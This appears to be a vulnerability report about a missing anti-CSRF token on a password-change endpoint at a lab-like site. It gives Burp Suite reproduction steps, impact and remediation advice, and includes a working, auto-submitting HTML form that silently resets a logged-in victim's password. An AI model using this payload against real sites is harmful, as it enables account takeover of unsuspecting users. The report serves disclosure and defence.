CSRF-7

Title
CSRF Password Change via Missing Anti-CSRF Token

Vulnerability Type
Cross-Site Request Forgery (CSRF)

Summary
I was testing the password change functionality and noticed the request goes through with no token or session validation attached to it. I went ahead and crafted a malicious HTML page, sent it to the victim and the moment they opened it their password changed to mine. No clicks needed, no forms to fill, just open the page and its done.
```
http://kzlabs.in/1307.php?action=settings

```
Vulnerable Endpoint
POST /1307.php?action=settings
Parameter: new_password, confirm_password

Steps to Reproduce
1.Log into the application at
````

http://kzlabs.in/1307.php?action=settings
````
2.Head over to account settings and type in a new password
3.Turn on Intercept in Burp before hitting submit
4.Click Change Password and catch the request in Burp
5.Right click the request and go to Engagement Tools then Generate CSRF PoC
6.Save the HTML file it gives you
7.Open that file in a browser while still logged in
8.Password changes automatically, no warning, no validation, nothing stops it

Crafted Request
````
````
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://kzlabs.com/1307.php?action=settings" method="POST">
      <input type="hidden" name="new_password" value="741852" />
      <input type="hidden" name="confirm_password" value="741852" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Impact

1.Victim password gets changed the moment they open the attacker link
2.Attacker logs straight into the account after changing the password
3.Victim gets no notification, no popup, no warning at all

Remediation

1.Generate a unique CSRF token per session and tie it to every password change request
2.Reject any request where the token is missing or does not match
3.Cross check the Origin and Referer headers and drop anything that did not originate from your own domain
